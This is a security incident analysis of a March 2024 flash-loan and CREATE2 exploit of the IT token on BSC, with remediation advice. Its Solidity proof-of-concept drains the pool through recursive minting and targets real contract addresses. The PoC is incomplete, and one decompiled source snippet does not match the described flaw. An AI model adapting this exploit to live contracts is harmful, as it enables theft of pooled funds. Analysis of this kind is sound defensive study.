# IT — Flash Loan + CREATE2 mintToPoolIfNeeded Logic Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | IT Token |
| **Chain** | BSC |
| **Loss** | ~$13,000 |
| **V3 Pool** | [0x92b7807b](https://bscscan.com/address/0x92b7807bF19b7DDdf89b706143896d05228f3121) |
| **IT/USDT V2 Pair** | [0x72655539](https://bscscan.com/address/0x7265553986a81c838867aA6B3625ABA97B961f00) |
| **IT Token** | [0x1AC5Fac8](https://bscscan.com/address/0x1AC5Fac863c0a026e029B173f2AE4D33938AB473) |
| **PancakeV2 Router** | [0x10ED43C7](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | A reserve calculation flaw in the `mintToPoolIfNeeded()` function causes pre-deposited balances at a CREATE2-predicted address to be treated as legitimate reserves, enabling excessive minting through a 9-iteration swap cycle |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/IT_exp.sol) |

---

## 1. Vulnerability Overview

The IT token's `mintToPoolIfNeeded()` function automatically mints tokens when the V2 pair's reserves fall short. The attacker pre-computes the address of an intermediate contract (Money) using CREATE2 and transfers USDT to that address before deployment. After flash-borrowing 2,000 IT from a V3 pool, the `pancakeV3FlashCallback()` deploys the Money contract, which in its constructor executes an approval and a recursive call to `hack()`, amplifying the reserve imbalance across 9 swap cycles.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: mintToPoolIfNeeded reserve calculation flaw
function mintToPoolIfNeeded() internal {
    (uint112 r0, uint112 r1,) = pair.getReserves();
    uint256 actualBalance = balanceOf(address(pair));
    // Mints additional tokens if reserves < actual balance — manipulable
    if (r0 < actualBalance) {
        uint256 mintAmount = actualBalance - r0;
        _mint(address(pair), mintAmount);
        pair.sync();
    }
}

// USDT pre-deposited at CREATE2-predicted address → triggers auto-swap on deployment
// 9 iterations amplify the reserve imbalance

// ✅ Safe code: minimum imbalance threshold + cooldown on mint condition
uint256 private lastMintBlock;

function mintToPoolIfNeeded() internal {
    require(block.number > lastMintBlock + MINT_COOLDOWN, "too frequent");
    (uint112 r0, uint112 r1,) = pair.getReserves();
    uint256 actualBalance = balanceOf(address(pair));
    uint256 diff = actualBalance > r0 ? actualBalance - r0 : 0;
    require(diff > MIN_MINT_THRESHOLD, "diff too small");
    lastMintBlock = block.number;
    _mint(address(pair), diff);
    pair.sync();
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: IT_decompiled.sol
contract IT {
    function mint(address p0, int24 p1, int24 p2, uint128 p3, bytes memory p4) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Pre-compute Money contract address via CREATE2
  │
  ├─→ [2] Transfer USDT to predicted address (before deployment)
  │
  ├─→ [3] Flash-borrow 2,000 IT from V3 pool
  │
  ├─→ [4] pancakeV3FlashCallback(): Deploy Money contract
  │         └─ Constructor: approve IT + call hack()
  │
  ├─→ [5] hack() recurses 9 times: repeatedly triggers mintToPoolIfNeeded()
  │         └─ Each cycle amplifies the reserve imbalance
  │
  ├─→ [6] Final swap to extract USDT
  │
  └─→ [7] Repay V3 flash loan + ~$13K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IIT {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract Money {
    constructor(address attacker, address itToken, uint256 itAmount) {
        // Immediately approve IT tokens and call hack() from the constructor
        IIT(itToken).approve(attacker, type(uint256).max);
        IAttacker(attacker).hack(9);  // 9 recursive calls
    }
}

contract AttackContract {
    IPancakeV3Pool constant v3Pool = IPancakeV3Pool(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    IIT           constant IT     = IIT(0x1AC5Fac863c0a026e029B173f2AE4D33938AB473);
    IERC20        constant USDT   = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function testExploit() external {
        // [1] Compute CREATE2 predicted address
        address predicted = computeCreate2Address(salt, type(Money).creationCode);

        // [2] Pre-transfer USDT to predicted address
        USDT.transfer(predicted, usdtAmount);

        // [3] Flash-borrow 2,000 IT from V3 pool
        v3Pool.flash(address(this), 2000e18, 0, "");
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes calldata) external {
        // [4] Deploy Money contract → constructor triggers hack()
        new Money{salt: salt}(address(this), address(IT), 2000e18);

        // [5] Repay flash loan
        IT.transfer(address(v3Pool), 2000e18 + fee);
    }

    function hack(uint256 depth) external {
        if (depth == 0) return;
        // Swap that triggers mintToPoolIfNeeded
        swapITtoUSDT();
        hack(depth - 1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Business Logic Flaw + CREATE2 Address Prediction |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (Flash Loan + CREATE2 + Recursive Mint Trigger) |
| **DApp Category** | Auto-mint Token + Uniswap V2 Pair |
| **Impact** | LP funds drained via amplified reserve imbalance |

## 6. Remediation Recommendations

1. **mintToPoolIfNeeded cooldown**: Prevent minting more than once per block
2. **Minimum imbalance threshold**: Only mint when the reserve discrepancy exceeds a minimum threshold
3. **CREATE2 address security**: Deploy-time validation to prevent pre-funding of predictable addresses
4. **Recursive call depth limit**: Strictly limit the number of mint triggers within a single transaction

## 7. Lessons Learned

- Automatic mint mechanisms like `mintToPoolIfNeeded()` can be repeatedly triggered via recursive calls or flash loans.
- Pre-computing a deployment address with CREATE2 and pre-depositing assets before deployment is a powerful attack vector that abuses initialization logic.
- Automated token minting mechanisms must enforce cooldowns and maximum mint caps.